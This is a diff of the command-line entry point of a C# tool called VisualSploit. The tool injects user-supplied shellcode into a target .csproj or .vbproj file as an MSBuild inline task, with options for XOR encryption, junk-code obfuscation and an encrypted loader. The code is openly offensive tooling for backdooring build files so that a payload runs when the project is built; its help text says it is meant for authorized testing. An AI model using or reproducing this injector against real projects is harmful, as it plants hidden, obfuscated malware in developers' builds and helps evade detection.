@@ -1,185 +1,148 @@
-using VisualSploit.Obfuscation;
+using System.CommandLine;
+using System.CommandLine.Invocation;
+using VisualSploit.Core;
+using VisualSploit.Templates;
 
 namespace VisualSploit;
 
 class Program
 {
-    const string Banner = "VisualSploit - MSBuild Inline Task Injection";
-
     static int Main(string[] args)
+    {
+        var projectArg = new Argument<FileInfo>("project")
+        {
+            Description = "Target .csproj or .vbproj file"
+        };
+        var shellcodeArg = new Argument<FileInfo>("shellcode")
+        {
+            Description = "Shellcode file (raw bytes or hex)"
+        };
+
+        var outputOption = new Option<FileInfo?>("-o", "--output")
+        {
+            Description = "Output path (default: in-place)"
+        };
+
+        var noBackupOption = new Option<bool>("--no-backup")
+        {
+            Description = "Skip backup"
+        };
+
+        var methodsOption = new Option<string?>("-m", "--methods")
+        {
+            Description = "Obfuscation methods: shellcode,junk"
+        };
+
+        var encryptOption = new Option<bool>("-e", "--encrypt")
+        {
+            Description = "Encrypted payload loader"
+        };
+
+        var roundsOption = new Option<int>("-r", "--rounds")
+        {
+            Description = "XOR rounds 1-5",
+            DefaultValueFactory = _ => 3
+        };
+
+        var seedOption = new Option<int?>("-s", "--seed")
+        {
+            Description = "RNG seed for reproducibility"
+        };
+
+        var rootCommand = new RootCommand("VisualSploit - MSBuild Inline Task Injection")
+        {
+            projectArg,
+            shellcodeArg,
+            outputOption,
+            noBackupOption,
+            methodsOption,
+            encryptOption,
+            roundsOption,
+            seedOption
+        };
+
+        rootCommand.SetAction((ctx, _) =>
+        {
+            var project = ctx.GetValue(projectArg)!;
+            var shellcode = ctx.GetValue(shellcodeArg)!;
+            var output = ctx.GetValue(outputOption);
+            var noBackup = ctx.GetValue(noBackupOption);
+            var methods = ctx.GetValue(methodsOption);
+            var encrypt = ctx.GetValue(encryptOption);
+            var rounds = ctx.GetValue(roundsOption);
+            var seed = ctx.GetValue(seedOption);
+
+            Execute(project, shellcode, output, noBackup, methods, encrypt, rounds, seed);
+
+            return Task.CompletedTask;
+        });
+
+        return rootCommand.Parse(args).Invoke();
+    }
+
+    static void Execute(
+        FileInfo project,
+        FileInfo shellcode,
+        FileInfo? output,
+        bool noBackup,
+        string? methods,
+        bool encrypt,
+        int rounds,
+        int? seed)
     {
         try
         {
-            if (args.Length == 0 || args.Contains("-h") || args.Contains("--help"))
-            {
-                ShowHelp();
-                return 0;
-            }
+            if (rounds < 1 || rounds > 5)
+                throw new ArgumentException("XOR rounds must be between 1 and 5");
 
-            if (args.Contains("-v") || args.Contains("--version"))
-            {
-                Console.WriteLine("VisualSploit");
-                return 0;
-            }
+            var m = ParseMethods(methods);
 
-            var options = ParseArgs(args);
+            var cfg = new Config(Encrypt: encrypt, Methods: m, XorRounds: rounds, Seed: seed);
 
-            Console.WriteLine(Banner);
+            Console.WriteLine("VisualSploit - MSBuild Inline Task Injection");
             Console.WriteLine();
 
-            Console.Write("[*] Generating inline task... ");
-            var payload = Payload.Generate(options.ShellcodePath, options.ObfuscationConfig);
+            Console.Write("Generating inline task... ");
+            var payload = MsBuild.Wrap(shellcode.FullName, cfg);
             Console.WriteLine("done");
 
-            if (options.ObfuscationConfig.UseObfuscation)
-                Console.WriteLine($"[*] Obfuscation: {options.ObfuscationConfig.Methods}");
+            if (m != Methods.None)
+                Console.WriteLine($"Obfuscation: {m}");
 
-            Console.Write("[*] Injecting payload... ");
-            Injector.Inject(options.ProjectPath, payload, options.Output, !options.NoBackup);
+            Console.Write("Injecting payload... ");
+            var outputPath = output?.FullName;
+            Injector.Inject(project.FullName, payload, outputPath, !noBackup);
             Console.WriteLine("done");
 
-            var outputPath = options.Output ?? options.ProjectPath;
-            Console.WriteLine($"[+] Success: {outputPath}");
+            Console.WriteLine($"Success: {outputPath ?? project.FullName}");
 
-            if (!options.NoBackup && options.Output == null)
-                Console.WriteLine($"[+] Backup: {options.ProjectPath}.bak");
-
-            return 0;
+            if (!noBackup && output == null)
+                Console.WriteLine($"Backup: {project.FullName}.bak");
         }
         catch (Exception ex)
         {
-            Console.Error.WriteLine($"[!] Error: {ex.Message}");
-            return 1;
+            Console.Error.WriteLine($"Error: {ex.Message}");
+            Environment.ExitCode = 1;
         }
     }
 
-    static CliOptions ParseArgs(string[] args)
+    static Methods ParseMethods(string? str)
     {
-        string? projectPath = null;
-        string? shellcodePath = null;
-        string? output = null;
-        bool noBackup = false;
-        bool useEncryptedLoader = false;
-        ObfuscationMethods methods = ObfuscationMethods.None;
-        int xorRounds = 3;
-        int? seed = null;
+        if (string.IsNullOrEmpty(str))
+            return Methods.None;
 
-        for (int i = 0; i < args.Length; i++)
+        var r = Methods.None;
+        var parts = str.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
+
+        foreach (var p in parts)
         {
-            var arg = args[i];
-
-            if (arg == "-o" || arg == "--output")
+            r |= p.ToLower() switch
             {
-                if (i + 1 >= args.Length)
-                    throw new ArgumentException("Missing value for -o");
-                output = args[++i];
-            }
-            else if (arg == "--no-backup")
-            {
-                noBackup = true;
-            }
-            else if (arg == "-e" || arg == "--encrypt")
-            {
-                useEncryptedLoader = true;
-            }
-            else if (arg == "-m" || arg == "--methods")
-            {
-                if (i + 1 >= args.Length)
-                    throw new ArgumentException("Missing value for -m");
-                methods = ParseMethods(args[++i]);
-            }
-            else if (arg == "-r" || arg == "--rounds")
-            {
-                if (i + 1 >= args.Length)
-                    throw new ArgumentException("Missing value for -r");
-                xorRounds = int.Parse(args[++i]);
-                if (xorRounds < 1 || xorRounds > 5)
-                    throw new ArgumentException("XOR rounds must be between 1 and 5");
-            }
-            else if (arg == "-s" || arg == "--seed")
-            {
-                if (i + 1 >= args.Length)
-                    throw new ArgumentException("Missing value for -s");
-                seed = int.Parse(args[++i]);
-            }
-            else if (projectPath == null)
-            {
-                projectPath = arg;
-            }
-            else if (shellcodePath == null)
-            {
-                shellcodePath = arg;
-            }
-            else
-            {
-                throw new ArgumentException($"Unexpected argument: {arg}");
-            }
-        }
-
-        if (projectPath == null || shellcodePath == null)
-            throw new ArgumentException("Missing required arguments. Use --help for usage.");
-
-        var useObfuscation = methods != ObfuscationMethods.None;
-
-        var config = new ObfuscationConfig(
-            UseObfuscation: useObfuscation,
-            UseEncryptedLoader: useEncryptedLoader,
-            Methods: methods,
-            XorRounds: xorRounds,
-            Seed: seed
-        );
-
-        return new CliOptions(projectPath, shellcodePath, output, noBackup, config);
-    }
-
-    static ObfuscationMethods ParseMethods(string methodsStr)
-    {
-        var methods = ObfuscationMethods.None;
-        var parts = methodsStr.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
-
-        foreach (var part in parts)
-        {
-            methods |= part.ToLower() switch
-            {
-                "shellcode" => ObfuscationMethods.ShellcodeEncryption,
-                "junk" => ObfuscationMethods.JunkCodeInjection,
-                _ => throw new ArgumentException($"Unknown obfuscation method: {part}")
+                "shellcode" => Methods.Xor,
+                "junk" => Methods.Junk,
+                _ => throw new ArgumentException($"Unknown method: {p}")
             };
         }
-
-        return methods;
+        return r;
     }
-
-
-    static void ShowHelp()
-    {
-        Console.WriteLine(Banner);
-        Console.WriteLine();
-        Console.WriteLine("Usage:");
-        Console.WriteLine("  visualsploit <project> <shellcode> [options]");
-        Console.WriteLine();
-        Console.WriteLine("Arguments:");
-        Console.WriteLine("  <project>           Target .csproj or .vbproj file");
-        Console.WriteLine("  <shellcode>         Shellcode file (raw bytes or hex)");
-        Console.WriteLine();
-        Console.WriteLine("Options:");
-        Console.WriteLine("  -o, --output <f>    Output path (default: in-place)");
-        Console.WriteLine("  --no-backup         Skip backup");
-        Console.WriteLine("  -m, --methods <l>   Obfuscation: shellcode,junk");
-        Console.WriteLine("  -e, --encrypt       Encrypted payload loader");
-        Console.WriteLine("  -r, --rounds <n>    XOR rounds 1-5 (default: 3)");
-        Console.WriteLine("  -s, --seed <n>      RNG seed for reproducibility");
-        Console.WriteLine("  -h, --help          Show help");
-        Console.WriteLine("  -v, --version       Show version");
-        Console.WriteLine();
-        Console.WriteLine("Examples:");
-        Console.WriteLine("  visualsploit target.csproj payload.bin");
-        Console.WriteLine("  visualsploit target.csproj payload.bin -m shellcode,junk");
-        Console.WriteLine("  visualsploit target.csproj payload.bin -e");
-        Console.WriteLine("  visualsploit target.csproj payload.bin -m shellcode,junk -e -s 12345");
-        Console.WriteLine();
-        Console.WriteLine("For authorized security testing only.");
-    }
-
-    record CliOptions(string ProjectPath, string ShellcodePath, string? Output, bool NoBackup, ObfuscationConfig ObfuscationConfig);
 }
